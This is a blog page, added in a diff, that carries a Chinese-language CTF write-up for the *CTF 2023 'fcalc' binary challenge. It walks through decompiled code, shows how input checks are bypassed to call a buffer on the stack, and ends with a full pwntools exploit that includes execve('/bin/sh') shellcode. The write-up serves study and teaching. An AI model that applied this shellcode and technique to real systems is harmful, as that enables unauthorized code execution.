@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="比赛名应该是*ctf 但是由于我hexo框架不能命名为 * 所以只能叫星了 fcalc 没有开启NX保护 第一反应就是要打shellcode void __fastcall __noreturn main(int a1, char **a2, char **a3)&amp;#123;  void *v3; &#x2F;&#x2F; rsp  void *v4; &#x2F;&#x2F; rsp  double *v5; &#x2F;&#x2F; rbx  int">
+<meta property="og:type" content="article">
+<meta property="og:title" content="星ctf2023">
+<meta property="og:url" content="http://example.com/2023/07/30/%E6%98%9Fctf2023/index.html">
+<meta property="og:site_name" content="C12en">
+<meta property="og:description" content="比赛名应该是*ctf 但是由于我hexo框架不能命名为 * 所以只能叫星了 fcalc 没有开启NX保护 第一反应就是要打shellcode void __fastcall __noreturn main(int a1, char **a2, char **a3)&amp;#123;  void *v3; &#x2F;&#x2F; rsp  void *v4; &#x2F;&#x2F; rsp  double *v5; &#x2F;&#x2F; rbx  int">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307300137270.png">
+<meta property="article:published_time" content="2023-07-29T17:29:23.000Z">
+<meta property="article:modified_time" content="2023-09-14T17:21:07.486Z">
+<meta property="article:author" content="C12en">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307300137270.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+    
+    <!-- title -->
+    <title>星ctf2023</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="C12en" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/07/30/NssCTF-round14/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/07/26/Ciscn2023%E5%86%B3%E8%B5%9B/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/07/30/%E6%98%9Fctf2023/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/07/30/%E6%98%9Fctf2023/&text=星ctf2023"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/07/30/%E6%98%9Fctf2023/&title=星ctf2023"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/07/30/%E6%98%9Fctf2023/&is_video=false&description=星ctf2023"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=星ctf2023&body=Check out this article: http://example.com/2023/07/30/%E6%98%9Fctf2023/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/07/30/%E6%98%9Fctf2023/&title=星ctf2023"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/07/30/%E6%98%9Fctf2023/&title=星ctf2023"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/07/30/%E6%98%9Fctf2023/&title=星ctf2023"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/07/30/%E6%98%9Fctf2023/&title=星ctf2023"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/07/30/%E6%98%9Fctf2023/&name=星ctf2023&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/07/30/%E6%98%9Fctf2023/&t=星ctf2023"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fcalc"><span class="toc-number">1.</span> <span class="toc-text">fcalc</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        星ctf2023
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">C12en</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-07-29T17:29:23.000Z" class="dt-published" itemprop="datePublished">2023-07-30</time>
+        
+        (Updated: <time datetime="2023-09-14T17:21:07.486Z" class="dt-updated" itemprop="dateModified">2023-09-15</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/wp/">wp</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>比赛名应该是*ctf 但是由于我hexo框架不能命名为 * 所以只能叫星了</p>
+<h2 id="fcalc"><a href="#fcalc" class="headerlink" title="fcalc"></a>fcalc</h2><p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307300137270.png" title="image-20230730013704199" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307300137270.png" alt="image-20230730013704199"></a></p>
+<p>没有开启NX保护 第一反应就是要打shellcode</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">double</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-44h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">double</span> *v9; <span class="comment">// [rsp+20h] [rbp-38h]</span></span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// [rsp+28h] [rbp-30h]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line">  <span class="type">double</span> v12; <span class="comment">// [rsp+38h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+40h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">400LL</span>);</span><br><span class="line">  s = (<span class="number">16</span> * ((&amp;v6 + <span class="number">3</span>) &gt;&gt; <span class="number">4</span>));</span><br><span class="line">  v4 = alloca(<span class="number">64LL</span>);</span><br><span class="line">  buf = s;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x180</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  qword_40E0 = s;</span><br><span class="line">  dword_4010 = <span class="number">0</span>;</span><br><span class="line">  sub_1384();</span><br><span class="line">  say();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = read(<span class="number">0</span>, buf, <span class="number">0x180</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt; <span class="number">47</span> )</span><br><span class="line">      v6 = <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6 &amp;&amp; *(buf + i) != <span class="string">&#x27;\n&#x27;</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(buf + i) &lt;= <span class="number">0x20</span> || *(buf + i) &gt; <span class="number">0x30</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(buf + i) &gt; <span class="number">0x2F</span> &amp;&amp; *(buf + i) &lt;= <span class="number">0x39</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( dword_4010 &gt; <span class="number">47</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ++dword_4010;</span><br><span class="line">          v5 = qword_40E0;</span><br><span class="line">          *v5 = atof(buf + i);</span><br><span class="line">          qword_40E0 += <span class="number">8LL</span>;</span><br><span class="line">          <span class="keyword">while</span> ( *(buf + i + <span class="number">1</span>) == <span class="number">0x2E</span> || *(buf + i + <span class="number">1</span>) &gt; <span class="number">0x2F</span> &amp;&amp; *(buf + i + <span class="number">1</span>) &lt;= <span class="number">0x39</span> )</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                      <span class="comment">// (0x20,0x30]</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( dword_4010 &lt;= <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v9 = s;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">47</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          v12 = <span class="built_in">fabs</span>(*v9);</span><br><span class="line">          <span class="keyword">if</span> ( v12 != <span class="number">0.0</span> &amp;&amp; (v12 &lt; <span class="number">1.0</span> || v12 &gt; <span class="number">100.0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ERROR: %lf\n&quot;</span>, v12);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ++v9;</span><br><span class="line">        &#125;</span><br><span class="line">        (qword_4060[*(buf + i) - <span class="number">0x20</span>])();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( s &lt; qword_40E0 )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Result: %lf\n&quot;</span>, *(qword_40E0 - <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先需要逆向出来和菜单交互的格式 我们需要使得dword_4010大于1 同时还要绕过这两个循环</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( *(buf + i + <span class="number">1</span>) == <span class="number">0x2E</span> || *(buf + i + <span class="number">1</span>) &gt; <span class="number">0x2F</span> &amp;&amp; *(buf + i + <span class="number">1</span>) &lt;= <span class="number">0x39</span> )</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">47</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          v12 = <span class="built_in">fabs</span>(*v9);</span><br><span class="line">          <span class="keyword">if</span> ( v12 != <span class="number">0.0</span> &amp;&amp; (v12 &lt; <span class="number">1.0</span> || v12 &gt; <span class="number">100.0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ERROR: %lf\n&quot;</span>, v12);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ++v9;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一个循环 相对来说容易 只需要在对应字符后面加上超出范围的字符即可</p>
+<p>第二个循环限制比较大 对0x48个字长的空间都进行了check</p>
+<p>随后呢根据输入的字符 取决调用哪个函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 (__fastcall *sub_1384())()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 (__fastcall *result)(); <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  qword_4060[<span class="number">0</span>] = printf_nop;</span><br><span class="line">  qword_4068 = printf_nop;</span><br><span class="line">  qword_4070 = printf_nop;</span><br><span class="line">  qword_4078 = printf_nop;</span><br><span class="line">  qword_4080 = printf_nop;</span><br><span class="line">  qword_4088 = printf_nop;</span><br><span class="line">  qword_4090 = printf_nop;</span><br><span class="line">  qword_4098 = printf_nop;</span><br><span class="line">  qword_40A0 = printf_nop;</span><br><span class="line">  qword_40A8 = printf_nop;</span><br><span class="line">  qword_40B0 = sub_12BB;</span><br><span class="line">  qword_40B8 = sub_1208 + <span class="number">1</span>;</span><br><span class="line">  qword_40C0 = printf_nop;</span><br><span class="line">  qword_40C8 = sub_1262;</span><br><span class="line">  qword_40D0 = printf_nop;</span><br><span class="line">  result = sub_1314;</span><br><span class="line">  qword_40D8 = sub_1314;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>顺便在main函数的开头 还隐藏着一个buf地址</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">qword_40E0 = s;</span><br></pre></td></tr></table></figure>
+
+<p>我们通过字符’0’就可以实现call buf 这里就存在了shellcode的调用</p>
+<p>由于我们刚才说到的check的存在 我们没办法把shellcode放到payload后面 所以需要通过把shellcode写到不会被check的前面 然后控制rsp寄存器再跳转过去</p>
+<p>完整exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> pwn_pb2</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;47.92.7.93&quot;,8802)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter your expression:&quot;</span>)</span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">add rsp,0x10</span></span><br><span class="line"><span class="string">jmp rsp</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;\x35\x40\x35\x40\x30\x30\x30\x30&#x27;</span>+<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span>+cyclic(<span class="number">0x21</span>)+p64(<span class="number">0x4014000000000000</span>)*<span class="number">2</span>+asm(shellcode)+<span class="string">b&#x27;\x40\x40&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x187a)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fcalc"><span class="toc-number">1.</span> <span class="toc-text">fcalc</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/07/30/%E6%98%9Fctf2023/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/07/30/%E6%98%9Fctf2023/&text=星ctf2023"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/07/30/%E6%98%9Fctf2023/&title=星ctf2023"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/07/30/%E6%98%9Fctf2023/&is_video=false&description=星ctf2023"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=星ctf2023&body=Check out this article: http://example.com/2023/07/30/%E6%98%9Fctf2023/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/07/30/%E6%98%9Fctf2023/&title=星ctf2023"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/07/30/%E6%98%9Fctf2023/&title=星ctf2023"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/07/30/%E6%98%9Fctf2023/&title=星ctf2023"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/07/30/%E6%98%9Fctf2023/&title=星ctf2023"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/07/30/%E6%98%9Fctf2023/&name=星ctf2023&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/07/30/%E6%98%9Fctf2023/&t=星ctf2023"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    C12en
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'c12en';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
